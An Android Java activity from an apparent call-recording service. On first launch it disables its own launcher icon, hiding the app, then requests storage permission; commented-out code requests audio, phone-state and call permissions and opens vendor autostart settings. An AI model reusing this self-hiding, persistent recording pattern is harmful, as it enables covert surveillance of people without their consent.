package in.co.one.angry.acrservice;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.content.PermissionChecker;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

public class JustToLaunch extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this,in.co.one.angry.acrservice.JustToLaunch.class);
//        // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        sBase.requestWrite(this);
//        Intent i = new Intent(this, FileShowActivity.class);
////            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        startActivity(i);
//        sBase.requestOutgoingCall(this);
//        sBase.requestReadPhoneState(this);
//        sBase.requestRecordAudio(this);
        //if(sBase.isWRITE_PERMISSION){

        //}
        finish();
    }

//    @Override
//    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
//        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
//        switch (requestCode){
//            case sBase.RECORD_AUDIO_PERMISSION:{
//                if(grantResults.length>0) {
//                    if (grantResults[0] == PermissionChecker.PERMISSION_GRANTED) {
//                        Intent intent = new Intent();
//                        if (Build.BRAND.equalsIgnoreCase("xiaomi")) {
//                            intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
//                            startActivity(intent);
//                        } else if (Build.BRAND.equalsIgnoreCase("oppo")) {
//                            intent.setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
//                            startActivity(intent);
//                        } else if (Build.BRAND.equalsIgnoreCase("vivo")) {
//                            intent.setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
//                            startActivity(intent);
//                        }
//                    }
//                }
//                break;
//            }
//            case sBase.READ_PHONE_STATE_PERMISSION:{
//                if(grantResults.length>0) {
//                    if (grantResults[0] == PermissionChecker.PERMISSION_GRANTED) {
//                        sBase.isREAD_PHONE_STATE_PERMISSION = true;
////                        sBase.requestOutgoingCall(this);
//                    }
//                }
//                break;
////            }
//            case sBase.RECORD_AUDIO_PERMISSION:{
//                if(grantResults.length>0) {
//                    if (grantResults[0] == PermissionChecker.PERMISSION_GRANTED) {
//                        sBase.isRECORD_AUDIO_PERMISSION = true;
////                        sBase.requestReadPhoneState(this);
//                    }
//                }
//                break;
//            }
//            case sBase.WRITE_PERMISSION:{
//                if(grantResults.length>0) {
//                    if (grantResults[0] == PermissionChecker.PERMISSION_GRANTED) {
//                        sBase.isWRITE_PERMISSION = true;
////                        sBase.requestRecordAudio(this);
//                    }
//                }
//                break;
////            }
//        }
//    }

//    @Override
//    protected void onResume() {
//        super.onResume();
//        if(!sBase.isFOLDER_CREATED){
//            sBase.requestFileFolder(this);
//        }
//        finish();
//    }
    
}
